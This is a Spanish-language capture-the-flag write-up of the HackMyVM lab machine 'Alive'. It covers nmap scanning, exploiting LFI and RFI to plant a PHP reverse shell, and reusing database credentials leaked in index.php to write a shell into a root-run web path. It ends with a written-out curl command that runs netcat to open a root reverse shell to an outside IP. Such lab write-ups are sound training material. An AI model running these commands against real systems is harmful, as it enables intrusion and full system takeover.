---
layout: post
title: "Write Up Alive. "
subtitle: "eJPTv2 Track "
category: Blog
tags: [Hard,Jounin,Linux,HMVM,SSH,GTFOBins,WireShark,Reconnaissance,Leaked-Information,Database,MySQL,Protocols,eJPTv2]
image:
  path: /assets/img/alive/alive.png
---

***

<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconnaissance


### Nmap


```bash
nmap --open -p- -Pn -n -T4 -vvv -n 198.168.100.52 -oN allports
```

![list](/assets/img/alive/1.png){:.lead width="800" height="100" loading="lazy"}


### Services and Versions


```bash
nmap -sVC -Pn -n -p22,80 198.168.100.52 -oN target
```

![list](/assets/img/alive/2.png){:.lead width="800" height="100" loading="lazy"}


***

## Vulnerability Analysis and Expltation


### HTTP TCP-80


Como siempre mno podemos hacer nada con el puerto 22, asi que vamos a intentar hacer algo con el puerto 80, ademas , si vemos las tecnologias vemos que hay un subdomino que vamos agregar al **/etc/hosts**, demommetola pagina que es vulnerablea LFI, por lo que vamos a porbar alhgunas rutas del  sistema  para ver informacion que podamos usar.


![list](/assets/img/alive/3.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Dominio.


![list](/assets/img/alive/4.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
LFI


![list](/assets/img/alive/5.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Vemos al usuario alexandra.


![list](/assets/img/alive/6.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
El código PHP permite a los usuarios ingresar una URL a través de un formulario y luego ejecuta el comando curl en el servidor para obtener y mostrar el contenido de la URL especificada. 


Volvemos a  fuzzera ya que no podemos hacer nada mas, yn encontramosun directorio **/tmp/**.


![list](/assets/img/alive/7.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Directorio **/tmp/**.


![list](/assets/img/alive/8.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Con lo que vimos antes el codiogo hace una peticion a  una web y tambien hay algunos caracteres  prohibidos pero el > no entonces que podemos hacer, lo primero es levantar un servidor web y provocar un RFI para subir una php-reverse-shell.php al  servidor y moverlo a **/var/www/hatml/tmp/** para ejecurarlo y obtener una shell como www-data.


![list](/assets/img/alive/10.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Obtenemos  shell como  www-data.


***

## Escalation Privileges


Primero, ejecutamos el comando **id** en Linux para obtener información sobre la identificación del usuario actual y los grupos a los que pertenece, ademas ejecutaremos **uname -a** y **lsb_release -a** para obtener información del sistema, verificaremossi otro usurio tiene permisos sudores con **sudo -l**, además, buscamos binarios con permisos **SUID** y tareas **Cron** en busca de posibles puntos de entrada. 


Si no encontramos resultados significativos con las acciones anteriores, procedemos a subir los binarios **linpeas** y **pspy** .etc, al sistema. Estos binarios nos ayudarán a realizar un análisis de reconocimiento más exhaustivo, identificando posibles vulnerabilidades o actividades sospechosas en el sistema.


También realizamos un análisis manual del sistema, buscando configuraciones inseguras, archivos sensibles o cualquier otra anomalía que pueda indicar una posible vulnerabilidad o actividad maliciosa.


Como es costumbre cuando somos www-data y debemos Husmear muy bie laruta porque en los archivos de configuracion o database hay la mayoria de veces datos importantes leakados.


![list](/assets/img/alive/11.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Credenciales encontradas en el archivo **index.php** que nos muestra las credenciales **admin:HeLL0alI4ns**, parecen ser de la  base de datos asi que vamos a ver que puertos estan abiertos, estan arriba, 3306 de mysql y 8000 http asi que vamos a husmear primero el http  y luego el otro.


![list](/assets/img/alive/15.png){:.lead width="800" height="100" loading="lazy"}


![list](/assets/img/alive/12.png){:.lead width="800" height="100" loading="lazy"}


![list](/assets/img/alive/13.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Estaba buscando el archivo ese para ver la ruta, porque no es la que estoy y busque muy en general luego busque de otra forma un poco mas personalizada `sudo grep -rl "Only local zipped backup." /`, encontre la  ruta para lo que esta en el  puerto 8000 es **/op/index.html**.
 

Hemos encontrado un servidor web iniciado por el usuario root en la ruta **/opt/**,ademas, hemos identificado otro proceso, el demonio de MySQL, que fue iniciado por root por lo que nos vamos a conectar a la base de datos.


![list](/assets/img/alive/16.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Esto lo  hacemos porque el que esta ejecutando HTTP ES **root** por ende si la reverse shell esta en laruta tambien se ejecutar como root pero nosotros no tenemos permisos porque somo www-data pero  con las credenciales de admin de la base de  datos podemos injectar el codigo y depositarloen la ruta que tiene permisos **root**.


![list](/assets/img/alive/19.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Al ejecutar `curl http://127.0.0.1:8000/shell.php?cmd=nc+-e+/bin/bash+192.168.100.34+443`, nos mandamos una reverse-shell como root nos ponemos a la escucha y ya podemos buscar la flag de root en el escritorio.


***

```bash
🎉 Felicitaciones ya has comprometido Alive de Hack My VM 🎉
```
{:.centered}

***

Back to [Certification eJPTv2 ](2023-06-02-Road-to-eJPTv2.md){:.heading.flip-title}
{:.read-more}
